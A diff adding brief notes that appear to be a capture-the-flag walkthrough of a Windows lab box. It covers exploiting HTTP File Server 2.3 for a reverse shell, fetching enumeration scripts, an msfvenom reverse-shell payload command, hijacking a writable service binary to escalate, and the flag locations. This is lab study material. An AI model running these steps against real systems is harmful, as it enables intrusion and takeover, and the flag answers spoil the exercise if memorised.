@@ -1,0 +1,32 @@
+go to website and view page source, the name of the .jpg file is the employee's name
+
+nmap scan shows http file server 2.3 running on port 8080, this is vulnerable to remote code execution exploit.
+search msfdb or exploitdb for the exploit and use it to a reverse shell.
+
+user flag is in C:\Users\bill\Desktop
+
+get winPEAS or PowerUp on to target machine:
+run a http file server and use powershell wget "http://IP:port/file.extension" -outfile "location/file.extension"
+run the script to find vulnerability on AdvancedSystemCareService9 where the execution is modifiable
+
+msfvenom -p windows/shell_reverse_tcp LHOST=... LPORT=... -e x86/shikata_ga_nai -f exe -o ASCService.exe
+things I learned abt msfvenom
+-e is encoding
+-f is file extension
+-o is output
+
+open a netcat listener on the port specified on the payload (or use metasploit multi handler)
+
+before uploading the payload check if you can stop and restart AdvancedSystemCareService9 
+on target machine
+>shell
+>sc stop servicename
+>sc start servicename
+
+stop the vulnerable service
+upload the .exe payload to the target and replace the legitimate .exe file
+start the vulnerable service again and the netcat listener should catch a shell
+
+root flag is in C:\Users\Administrator\Desktop
+
+type to view .txt file...
